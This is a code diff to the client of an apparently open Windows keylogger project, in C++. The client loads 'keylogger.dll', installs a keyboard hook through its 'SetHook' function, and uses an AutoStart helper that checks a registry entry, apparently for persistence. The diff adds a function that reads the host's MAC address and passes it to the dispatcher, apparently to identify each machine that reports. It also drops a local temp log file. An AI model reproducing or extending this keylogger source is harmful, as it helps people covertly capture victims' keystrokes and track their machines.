@@ -11,6 +11,34 @@ ClientLogger::~ClientLogger()
 
 }
 
+std::string	ClientLogger::getAddressMAC() const
+{
+	PIP_ADAPTER_INFO	adapterInfo;
+	ULONG				size;
+
+	size = sizeof(IP_ADAPTER_INFO);
+	adapterInfo = new IP_ADAPTER_INFO;
+	if (GetAdaptersInfo(adapterInfo, &size) != NO_ERROR)
+	{
+		delete adapterInfo;
+	}
+	else if (GetAdaptersInfo(adapterInfo, &size) == NO_ERROR)
+	{
+		std::stringstream ss("");
+
+		ss << std::setfill('0') << std::setw(2);
+		ss << std::hex << static_cast<int>(adapterInfo->Address[0]) << ":";
+		ss << std::hex << static_cast<int>(adapterInfo->Address[1]) << ":";
+		ss << std::hex << static_cast<int>(adapterInfo->Address[2]) << ":";
+		ss << std::hex << static_cast<int>(adapterInfo->Address[3]) << ":";
+		ss << std::hex << static_cast<int>(adapterInfo->Address[4]) << ":";
+		ss << std::hex << static_cast<int>(adapterInfo->Address[5]);
+		delete adapterInfo;
+		return (ss.str());
+	}
+	return ("");
+}
+
 bool	ClientLogger::init(const char *name)
 {
 	AutoStart start(name);
@@ -24,22 +52,11 @@ bool	ClientLogger::init(const char *name)
 	start.verifyPath();
 	start.verifyRegister();
 
-	if (GetUserName(username, &size) == 0)
-		return (false);
-
-	_filePath.append("C:\\Users\\");
-	_filePath.append(username);
-	_filePath.append("\\AppData\\Local\\Temp\\spider");
-
-	if ((file = CreateFile(_filePath.c_str(), GENERIC_WRITE, 0, NULL,
-		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
-		return (false);
-
 	if ((_hDll = LoadLibrary("keylogger.dll")) == NULL
 		|| (ptrHook = (hook)GetProcAddress(_hDll, "SetHook")) == NULL)
 		return (false);
 
-	_disp = std::shared_ptr<Dispatcher>(new Dispatcher);
+	_disp = std::shared_ptr<Dispatcher>(new Dispatcher(getAddressMAC()));
 
 	if (ptrHook(_disp) == false)
 		return (false);
@@ -71,7 +88,6 @@ bool	ClientLogger::unset()
 {
 	pFunc ptrFunc = NULL;
 
-	DeleteFile(_filePath.c_str());
 	if ((ptrFunc = (pFunc)GetProcAddress(_hDll, "RemoveHook")) == NULL)
 	{
 		std::cerr << GetLastError() << std::endl;
